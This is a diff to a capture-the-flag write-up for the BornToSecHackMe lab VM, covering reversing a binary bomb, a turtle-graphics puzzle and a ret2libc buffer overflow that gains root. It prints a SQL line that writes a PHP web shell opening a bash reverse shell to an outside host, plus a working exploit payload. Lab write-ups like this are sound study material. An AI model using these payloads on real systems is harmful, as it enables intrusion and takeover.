@@ -198,7 +198,8 @@ Stopped: Wed Nov 15 23:27:10 2023
 ```
 
 Basically we took the L here, it's not in the wordlist.
-## Getting a reverse shell
+
+# Getting a reverse shell
 
 ```
 SELECT '<?php system("bash -c \'bash -i >& /dev/tcp/192.168.56.1/12345 0>&1\'") ?>' into outfile "/var/www/forum/templates_c/revshell.php"
@@ -214,7 +215,7 @@ www-data@BornToSecHackMe:/var/www/forum/templates_c$ id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
-### Discovering
+## Discovering
 
 We can try to take a look at home directories
 
@@ -296,13 +297,13 @@ local: fun remote: fun
 ```
 
 
-### Exploring the FTP content
+## Exploring the FTP content
 
-#### `README` file
+### `README` file
 
 > Complete this little challenge and use the result as password for user 'laurie' to login in ssh
 
-#### `fun` file
+### `fun` file
 
 ```sh
 $ file fun
@@ -374,7 +375,7 @@ $ echo -n 'Iheartpwnage' | sha256sum
 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
 ```
 
-### The `laurie` user
+## The `laurie` user
 
 We can now try to log in as `laurie` using the password we found earlier.
 
@@ -435,8 +436,7 @@ o
 4
 ```
 
-
-### Reverse engineering the `bomb` binary
+## Reverse engineering the `bomb` binary
 
 Let's get the binary on our computer and reverse it.
 
@@ -456,7 +456,7 @@ bomb 100%   26KB  30.4MB/s   00:00
 
 Great, we will use `ghidra` to reverse it.
 
-#### `main` function
+### `main` function
 
 ```c
 int main(int argc, char **argv)
@@ -509,7 +509,7 @@ int main(int argc, char **argv)
 
 So it seems like the function that we're interested in is every `phase_X` function.
 
-#### `phase_1` function
+### `phase_1` function
 
 ```c
 void phase_1(char *s)
@@ -522,7 +522,7 @@ void phase_1(char *s)
 
 So we need to give the string `Public speaking is very easy.` to the program.
 
-#### `phase_2` function
+### `phase_2` function
 
 ```c
 void phase_2(char *s)
@@ -559,7 +559,7 @@ So we have to write 6 numbers to `stdin` separated by spaces. The first one shou
 
 Correct input : `1 2 6 24 120 720`
 
-#### `phase_3` function
+### `phase_3` function
 
 ```c
 void phase_3(char *input)
@@ -636,7 +636,7 @@ The readme's hint tells us the second input should be `b`, the only case where i
 
 Correct input : `1 b 214`
 
-#### `phase_4` function
+### `phase_4` function
 
 ```c
 int func4(int n)
@@ -669,7 +669,7 @@ void phase_4(char *input)
 
 The `func4` function computes the nth number of the Fibonacci sequence. To get `55` as a result, we need to give `9` as input.
 
-#### `phase_5` function
+### `phase_5` function
 
 ```c
 
@@ -738,7 +738,7 @@ Meaning that we have that we have these valid strings :
 3. `opukma`
 4. `opukmq`
 
-#### `phase_6` function
+### `phase_6` function
 
 Static analysis seemed to be a bit hard, and I'm lazy, so I just used `gdb` to get the password.
 
@@ -892,37 +892,7 @@ This loop checks that the `nodeX` globals are in ascending order, so we can dedu
 
 So, the correct new order is `4 2 6 3 1 5`.
 
-#### Full password
-
-1. `Public speaking is very easy.`
-2. `1 2 6 24 120 720`
-3. `1 b 214`
-4. `9`
-5. any of `opekma`, `opekmq`, `opukma`, `opukmq`
-6. `4 2 6 3 1 5`
-
-```sh
-echo -e "Public speaking is very easy.\n1 2 6 24 120 720\n1 b 214\n9\nopekma\n4 2 6 3 1 5" | ./bomb
-Welcome this is my little bomb !!!! You have 6 stages with
-only one life good luck !! Have a nice day!
-Phase 1 defused. How about the next one?
-That's number 2.  Keep going!
-Halfway there!
-So you got that one.  Try this one.
-Good work!  On to the next...
-Congratulations! You've defused the bomb!
-```
-
-Great! Now we just have to test what is the correct combination for the 5th phase.
-
-1. `Publicspeakingisveryeasy.126241207201b2149opekma426315`
-2. `Publicspeakingisveryeasy.126241207201b2149opekmq426315`
-3. `Publicspeakingisveryeasy.126241207201b2149opukma426315`
-4. `Publicspeakingisveryeasy.126241207201b2149opukmq426315`
-
-And, none of them worked.
-
-#### `phase_defused` function
+### `phase_defused` function
 
 The `phase_defused` function seems to be more than just a "congratulations" message.
 
@@ -1003,13 +973,13 @@ The bomb has blown up.
 
 So we have to find what to input to defuse the secret phase.
 
-#### `secret_phase` function
+### `secret_phase` function
 
 ```c
 typedef struct s_node { // complete deduction
   int data;
-  struct node *head;
-  struct node *next;
+  struct s_node *head;
+  struct s_node *next;
 } t_node;
 
 void secret_phase(void)
@@ -1039,15 +1009,15 @@ int fun7(t_node *n1, long n)
   if (n1 == NULL) {
     ret = -1;
   }
-  else if (n < n1.data) {
-    ret = fun7(n1.head, n); // n1 seems to be some kind of linked data struct
+  else if (n < n1->data) {
+    ret = fun7(n1->head, n); // n1 seems to be some kind of linked data struct
     ret = ret * 2;
   }
-  else if (n == n1.data) {
+  else if (n == n1->data) {
     ret = 0;
   }
   else {
-    ret = fun7(n1.next, n);
+    ret = fun7(n1->next, n);
     ret = ret * 2 + 1;
   }
   return ret;
@@ -1112,108 +1082,357 @@ gef➤  x/3x &n1
 | `n21` | `0x8` | `0x0804b2e4` | `0x0804b2fc` | `0x0804b314` |
 | `n22` | `0x32` | `0x0804b2f0` | `0x0804b2d8` | `0x0804b308` |
 | `n31` | `0x6` | `0x0804b2c0` | `0x0804b29c` | `0x0804b2e4` |
-| `n32` | `0x16` | `0x0804b2fc` | `0x0804b2a8` | `0x0804b2fc` |
-| `n33` | `0x2d` | `0x0804b2f0` | `0x0804b2cc` | `0x0804b2f0` |
-| `n34` | `0x6b` | `0x0804b2d8` | `0x0804b2b4` | `0x0804b2d8` |
-| `n41` | `0x1` | `0x0804b2c0` | `0x00000000` | `0x0804b2c0` |
-| `n42` | `0x7` | `0x0804b29c` | `0x00000000` | `0x0804b29c` |
-| `n43` | `0x14` | `0x0804b290` | `0x00000000` | `0x0804b290` |
-| `n44` | `0x23` | `0x0804b2a8` | `0x00000000` | `0x0804b2a8` |
-| `n45` | `0x28` | `0x0804b2cc` | `0x00000000` | `0x0804b2cc` |
-| `n46` | `0x2f` | `0x0804b284` | `0x00000000` | `0x0804b284` |
-| `n47` | `0x63` | `0x0804b2b4` | `0x00000000` | `0x0804b2b4` |
-| `n48` | `0x3e9` | `0x0804b278` | `0x00000000` | `0x0804b278` |
+| `n32` | `0x16` | `0x0804b290` | `0x0804b2a8` | `0x0804b2fc` |
+| `n33` | `0x2d` | `0x0804b2cc` | `0x0804b284` | `0x0804b2f0` |
+| `n34` | `0x6b` | `0x0804b2b4` | `0x0804b278` | `0x0804b2d8` |
+| `n41` | `0x1` | `0x00000000` | `0x00000000` | `0x0804b2c0` |
+| `n42` | `0x7` | `0x00000000` | `0x00000000` | `0x0804b29c` |
+| `n43` | `0x14` | `0x00000000` | `0x00000000` | `0x0804b290` |
+| `n44` | `0x23` | `0x00000000` | `0x00000000` | `0x0804b2a8` |
+| `n45` | `0x28` | `0x00000000` | `0x00000000` | `0x0804b2cc` |
+| `n46` | `0x2f` | `0x00000000` | `0x00000000` | `0x0804b284` |
+| `n47` | `0x63` | `0x00000000` | `0x00000000` | `0x0804b2b4` |
+| `n48` | `0x3e9` | `0x00000000` | `0x00000000` | `0x0804b278` |
 
-Let's convert this table to C code, I wrote a [small script](linked_list.py) to do that
+Let's convert this table to C code, I wrote a [small script](linked_list.py) to do that.
+
+Order them, add the `fun7` function, and we get :
 
 ```c
-t_node n1 = {
-    .data = 36,
-    .head = n21,
-    .next = n22
-};
+#include <stdio.h>
+#include <stdlib.h>
 
-t_node n21 = {
-    .data = 8,
-    .head = n31,
-    .next = n32
-};
+typedef struct s_node {
+    int data;
+    struct s_node *head;
+    struct s_node *next;
+} t_node;
 
-t_node n22 = {
-    .data = 50,
-    .head = n33,
-    .next = n34
-};
+int fun7(t_node *n1, long n)
+{
+    int ret;
 
-t_node n31 = {
-    .data = 6,
-    .head = n41,
-    .next = n42
-};
+    if (n1 == NULL) {
+        ret = -1;
+    }
+    else if (n < n1->data) {
+        ret = fun7(n1->head, n); // n1 seems to be some kind of linked data struct
+        ret = ret * 2;
+    }
+    else if (n == n1->data) {
+        ret = 0;
+    }
+    else {
+        ret = fun7(n1->next, n);
+        ret = ret * 2 + 1;
+    }
+    return ret;
+}
 
-t_node n32 = {
-    .data = 22,
-    .head = n32,
-    .next = n44
-};
+t_node n41 = { .data = 1, .head = NULL, .next = NULL };
+t_node n42 = { .data = 7, .head = NULL, .next = NULL };
+t_node n43 = { .data = 20, .head = NULL, .next = NULL };
+t_node n44 = { .data = 35, .head = NULL, .next = NULL };
+t_node n45 = { .data = 40, .head = NULL, .next = NULL };
+t_node n46 = { .data = 47, .head = NULL, .next = NULL };
+t_node n47 = { .data = 99, .head = NULL, .next = NULL };
+t_node n48 = { .data = 1001, .head = NULL, .next = NULL };
+t_node n31 = { .data = 6, .head = &n41, .next = &n42 };
+t_node n32 = { .data = 22, .head = NULL, .next = &n44 };
+t_node n33 = { .data = 45, .head = NULL, .next = &n45 };
+t_node n34 = { .data = 107, .head = NULL, .next = &n47 };
+t_node n21 = { .data = 8, .head = &n31, .next = &n32 };
+t_node n22 = { .data = 50, .head = &n33, .next = &n34 };
+t_node n1 = { .data = 36, .head = &n21, .next = &n22 };
 
-t_node n33 = {
-    .data = 45,
-    .head = n33,
-    .next = n45
-};
+int main(void)
+{
+    for (long n = -1; n < 1002; n++) {
+        int ret = fun7(&n1, n);
+        if (ret == 7) {
+            printf("[+] correct solution: %ld\n", n);
+            break;
+        }
+    }
+    return (0);
+}
+```
 
-t_node n34 = {
-    .data = 107,
-    .head = n34,
-    .next = n47
-};
+```sh
+$ gcc reverse.c -o reverse
+$ ./reverse
+[+] correct solution: 1001
+```
 
-t_node n41 = {
-    .data = 1,
-    .head = n41,
-    .next = NULL
-};
+### Full password
 
-t_node n42 = {
-    .data = 7,
-    .head = n42,
-    .next = NULL
-};
+1. `Public speaking is very easy.`
+2. `1 2 6 24 120 720`
+3. `1 b 214`
+4. `9`
+5. any of `opekma`, `opekmq`, `opukma`, `opukmq`
+6. `4 2 6 3 1 5`
 
-t_node n43 = {
-    .data = 20,
-    .head = n43,
-    .next = NULL
-};
+```sh
+echo -e "Public speaking is very easy.\n1 2 6 24 120 720\n1 b 214\n9 austinpowers\nopekma\n4 2 6 3 1 5\n1001" | ./bomb
+Welcome this is my little bomb !!!! You have 6 stages with
+only one life good luck !! Have a nice day!
+Phase 1 defused. How about the next one?
+That's number 2.  Keep going!
+Halfway there!
+So you got that one.  Try this one.
+Good work!  On to the next...
+Curses, you've found the secret phase!
+But finding it and solving it are quite different...
+Wow! You've defused the secret stage!
+Congratulations! You've defused the bomb!
+```
 
-t_node n44 = {
-    .data = 35,
-    .head = n44,
-    .next = NULL
-};
+Great! Now we just have to test what is the correct combination for the 5th phase.
 
-t_node n45 = {
-    .data = 40,
-    .head = n45,
-    .next = NULL
-};
+1. `Publicspeakingisveryeasy.126241207201b2149opekma426315`
+2. `Publicspeakingisveryeasy.126241207201b2149opekmq426315`
+3. `Publicspeakingisveryeasy.126241207201b2149opukma426315`
+4. `Publicspeakingisveryeasy.126241207201b2149opukmq426315`
 
-t_node n46 = {
-    .data = 47,
-    .head = n46,
-    .next = NULL
-};
+And, none of them worked.
 
-t_node n47 = {
-    .data = 99,
-    .head = n47,
-    .next = NULL
-};
+But the subject has an issue, and the password has two characters swapped.
 
-t_node n48 = {
-    .data = 1001,
-    .head = n48,
-    .next = NULL
-};
+- https://discord.com/channels/774300457157918772/785407595292131338/937840112849522778
+- https://stackoverflow.com/c/42network/questions/664
+
+So the valid password is : `Publicspeakingisveryeasy.126241207201b2149opekmq426135`, what a pain.
+
+> note: by becoming root using another method you'd find the password anyway, let's say that reversing the entire binary was the goal of this level, okay?
+
+## Turtle
+
+```sh
+$ ssh thor@192.168.56.103
+        ____                _______    _____           
+       |  _ \              |__   __|  / ____|          
+       | |_) | ___  _ __ _ __ | | ___| (___   ___  ___ 
+       |  _ < / _ \| '__| '_ \| |/ _ \\___ \ / _ \/ __|
+       | |_) | (_) | |  | | | | | (_) |___) |  __/ (__ 
+       |____/ \___/|_|  |_| |_|_|\___/_____/ \___|\___|
+
+                       Good luck & Have fun
+thor@192.168.56.101's password:
+thor@BornToSecHackMe:~$ ls -la
+total 37
+drwxr-x--- 3 thor     thor   129 Oct 15  2015 .
+drwxrwx--x 9 www-data root   126 Oct 13  2015 ..
+-rwxr-x--- 1 thor     thor     1 Oct 15  2015 .bash_history
+-rwxr-x--- 1 thor     thor   220 Oct  8  2015 .bash_logout
+-rwxr-x--- 1 thor     thor  3489 Oct 13  2015 .bashrc
+drwx------ 2 thor     thor    43 Oct 15  2015 .cache
+-rwxr-x--- 1 thor     thor   675 Oct  8  2015 .profile
+-rwxr-x--- 1 thor     thor    69 Oct  8  2015 README
+-rwxr-x--- 1 thor     thor 31523 Oct  8  2015 turtle
+thor@BornToSecHackMe:~$ cat README
+Finish this challenge and use the result as password for 'zaz' user.
+thor@BornToSecHackMe:~$ head -n 10 turtle
+Tourne gauche de 90 degrees
+Avance 50 spaces
+Avance 1 spaces
+Tourne gauche de 1 degrees
+Avance 1 spaces
+Tourne gauche de 1 degrees
+Avance 1 spaces
+Tourne gauche de 1 degrees
+Avance 1 spaces
+Tourne gauche de 1 degrees
+```
+
+This resembles a turtle script, something used in Logo, a very old programming language, which had a GUI you could use to draw stuff.
+
+Python re-implemented this with the `turtle` module.
+
+Let's parse and interpet the file using the turtle module.
+
+### Instructions in the `turtle` files
+
+The `turtle` file has these instructions :
+
+- `Tourne <gauche|droite> de <degrees> degrees`
+- `Avance <spaces> spaces`
+- `Recule <spaces> spaces`
+
+```py
+import turtle
+
+def parse_instruction(instruction):
+    instruction = instruction.strip()
+    if instruction.startswith("Tourne"):
+        _, direction, _, degrees, _ = instruction.split()
+        degrees = int(degrees)
+        if direction == "gauche":
+            turtle.left(degrees)
+        elif direction == "droite":
+            turtle.right(degrees)
+        else:
+            raise ValueError("Invalid direction")
+    elif instruction.startswith("Avance"):
+        _, spaces, _ = instruction.split()
+        spaces = int(spaces)
+        turtle.forward(spaces)
+    elif instruction.startswith("Recule"):
+        _, spaces, _ = instruction.split()
+        spaces = int(spaces)
+        turtle.backward(spaces)
+    else:
+        raise ValueError("Invalid instruction")
+
+if __name__ == "__main__":
+    with open("turtle", "r") as f:
+        for line in f:
+            parse_instruction(line)
+    turtle.done()
+```
+
+This script confusely draws the word `SLASH` on the screen. But this password does not work with the `zaz` user.
+
+The end of the file says `Can you digest the message? :)` which is a pun on the `digest` function of the `hashlib` module.
+
+We have to use `MD5` (Message-**Digest**) to hash the word `SLASH`.
+
+```sh
+$ echo -n 'SLASH' | md5sum
+646da671ca01bb5d84dbb5fb2238dc8e  -
+```
+
+And this is the password for the `zaz` user.
+
+## Binary exploitation
+
+```sh
+ssh zaz@192.168.56.101
+        ____                _______    _____           
+       |  _ \              |__   __|  / ____|          
+       | |_) | ___  _ __ _ __ | | ___| (___   ___  ___ 
+       |  _ < / _ \| '__| '_ \| |/ _ \\___ \ / _ \/ __|
+       | |_) | (_) | |  | | | | | (_) |___) |  __/ (__ 
+       |____/ \___/|_|  |_| |_|_|\___/_____/ \___|\___|
+
+                       Good luck & Have fun
+zaz@192.168.56.101's password: 
+zaz@BornToSecHackMe:~$ ls -la
+total 12
+drwxr-x--- 4 zaz      zaz   147 Oct 15  2015 .
+drwxrwx--x 9 www-data root  126 Oct 13  2015 ..
+-rwxr-x--- 1 zaz      zaz     1 Oct 15  2015 .bash_history
+-rwxr-x--- 1 zaz      zaz   220 Oct  8  2015 .bash_logout
+-rwxr-x--- 1 zaz      zaz  3489 Oct 13  2015 .bashrc
+drwx------ 2 zaz      zaz    43 Oct 14  2015 .cache
+-rwsr-s--- 1 root     zaz  4880 Oct  8  2015 exploit_me
+drwxr-x--- 3 zaz      zaz   107 Oct  8  2015 mail
+-rwxr-x--- 1 zaz      zaz   675 Oct  8  2015 .profile
+-rwxr-x--- 1 zaz      zaz  1342 Oct 15  2015 .viminfo
+zaz@BornToSecHackMe:~$ ls -lR mail/
+mail/:
+total 0
+-rwxr-x--- 1 zaz zaz 0 Oct  8  2015 INBOX.Drafts
+-rwxr-x--- 1 zaz zaz 0 Oct  8  2015 INBOX.Sent
+-rwxr-x--- 1 zaz zaz 0 Oct  8  2015 INBOX.Trash
+zaz@BornToSecHackMe:~$ ./exploit_me
+zaz@BornToSecHackMe:~$ ./exploit_me AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Segmentation fault (core dumped)
+```
+
+The `exploit_me` binary seems to be vulnerable to a buffer overflow.
+
+```sh
+zaz@BornToSecHackMe:~$ ltrace ./exploit_me AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+__libc_start_main(... <unfinished ...>)
+strcpy(0xbffff5e0, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"...)
+puts(...)
+--- SIGSEGV (Segmentation fault) ---
++++ killed by SIGSEGV +++
+```
+
+Cool! Let's break it quickly.
+
+```sh
+$ scp zaz@192.168.56.103:/home/zaz/exploit_me .
+```
+
+### Disassembly of `exploit_me`
+
+```c
+int main(int argc, char **argv)
+{
+  char buffer[140];
+  
+  if (argc > 1) {
+    strcpy(buffer, argv[1]);
+    puts(buffer);
+  }
+  return argc < 2;
+}
+```
+
+Nothing else is in the code, so we can do a `ret2libc` attack.
+
+### `ret2libc` attack
+
+```sh
+$ gdb ./exploit_me
+(gdb) b main
+Breakpoint 1 at 0x80483f7
+(gdb) r
+Starting program: /home/zaz/exploit_me 
+
+Breakpoint 1, 0x080483f7 in main ()
+(gdb) info proc map
+process 2507
+Mapped address spaces:
+
+        Start Addr   End Addr       Size     Offset objfile
+         0x8048000  0x8049000     0x1000        0x0 /home/zaz/exploit_me
+         0x8049000  0x804a000     0x1000        0x0 /home/zaz/exploit_me
+        0xb7e2b000 0xb7e2c000     0x1000        0x0 
+        0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
+        0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
+        0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
+        0xb7fd2000 0xb7fd5000     0x3000        0x0 
+        0xb7fdb000 0xb7fdd000     0x2000        0x0 
+        0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
+        0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
+        0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
+        0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
+        0xbffdf000 0xc0000000    0x21000        0x0 [stack]
+(gdb) find 0xb7e2c000,0xb7fd2000,"/bin/sh"
+0xb7f8cc58
+1 pattern found
+(gdb) x/s 0xb7f8cc58
+0xb7f8cc58:      "/bin/sh"
+(gdb) p system
+$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
+```
+
+### Writing the exploit
+
+```py
+import struct
+
+BIN_SH_ADDR = 0xb7f8cc58
+SYSTEM_ADDR = 0xb7e6b060
+PAYLOAD = "A" * 140 + struct.pack("<I", SYSTEM_ADDR) + "AAAA" + struct.pack("<I", BIN_SH_ADDR)
+print PAYLOAD
+```
+
+### Executing the exploit
+
+```sh
+zaz@BornToSecHackMe:~$ ./exploit_me $(python -c 'import struct;BIN_SH_ADDR = 0xb7f8cc58;SYSTEM_ADDR = 0xb7e6b060;PAYLOAD = "A" * 140 + struct
+.pack("<I", SYSTEM_ADDR) +"AAAA" + struct.pack("<I", BIN_SH_ADDR);print PAYLOAD')
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`��AAAAX���
+# 
+# id
+uid=1005(zaz) gid=1005(zaz) euid=0(root) groups=0(root),1005(zaz)
+# whoami
+root
+# 
 ```
